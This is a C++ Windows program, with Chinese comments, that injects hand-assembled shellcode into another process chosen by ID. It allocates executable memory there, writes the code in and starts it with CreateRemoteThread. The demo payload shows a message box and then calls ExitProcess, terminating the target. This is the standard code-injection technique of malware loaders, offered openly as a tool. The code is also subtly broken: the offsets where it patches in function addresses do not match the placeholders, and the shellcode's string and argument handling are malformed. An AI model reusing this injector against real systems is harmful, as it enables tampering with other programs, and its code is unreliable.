#include <windows.h>
#include <iostream>

int main() {
    DWORD processID;
    std::cout << "Enter Process ID: ";
    std::cin >> processID;

    // 获取Kernel32.dll和User32.dll的基址
    HMODULE hKernel32 = GetModuleHandleA("Kernel32.dll");
    HMODULE hUser32 = GetModuleHandleA("User32.dll");

    // 获取ExitProcess和MessageBoxA函数的地址
    FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");

    if (pExitProcess == NULL || pMessageBoxA == NULL) {
        std::cerr << "Could not resolve function address." << std::endl;
        return 1;
    }

    std::cout << "ExitProcess address: " << pExitProcess << std::endl;
    std::cout << "MessageBoxA address: " << pMessageBoxA << std::endl;

    // 示例Shellcode：简单的MessageBox和ExitProcess
    unsigned char shellcode[] = 
    "\x31\xc0"          // xor eax, eax
    "\x50"              // push eax
    "\x68\x62\x6f\x78\x21"  // push "box!"
    "\x68\x6d\x65\x73\x73"  // push "mess"
    "\x68\x61\x67\x65\x62"  // push "ageb"
    "\x68\x4d\x65\x73\x73"  // push "Mess"
    "\x8b\xdc"          // mov ebx, esp
    "\x31\xc9"          // xor ecx, ecx
    "\xb1\x10"          // mov cl, 16
    "\x31\xd2"          // xor edx, edx
    "\x52"              // push edx
    "\x53"              // push ebx
    "\x51"              // push ecx
    "\x52"              // push edx
    "\xb8\x00\x00\x00\x00"  // mov eax, pMessageBoxA (占位符)
    "\xff\xd0"          // call eax
    "\x31\xc0"          // xor eax, eax
    "\x50"              // push eax
    "\xb8\x00\x00\x00\x00"  // mov eax, pExitProcess (占位符)
    "\xff\xd0";         // call eax

    // 将实际的地址写入Shellcode中
    *reinterpret_cast<FARPROC*>(&shellcode[27]) = pMessageBoxA;
    *reinterpret_cast<FARPROC*>(&shellcode[42]) = pExitProcess;

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        std::cerr << "Could not open process: " << GetLastError() << std::endl;
        return 1;
    }

    // 分配内存
    LPVOID pRemoteShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteShellcode == NULL) {
        std::cerr << "Could not allocate memory in target process: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // 写入Shellcode
    if (!WriteProcessMemory(hProcess, pRemoteShellcode, (LPVOID)shellcode, sizeof(shellcode), NULL)) {
        std::cerr << "Could not write to target process memory: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 创建远程线程
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Could not create remote thread: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 等待线程执行完成
    WaitForSingleObject(hThread, INFINITE);

    // 清理
    VirtualFreeEx(hProcess, pRemoteShellcode, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "Shellcode injected and executed successfully!" << std::endl;
    return 0;
}
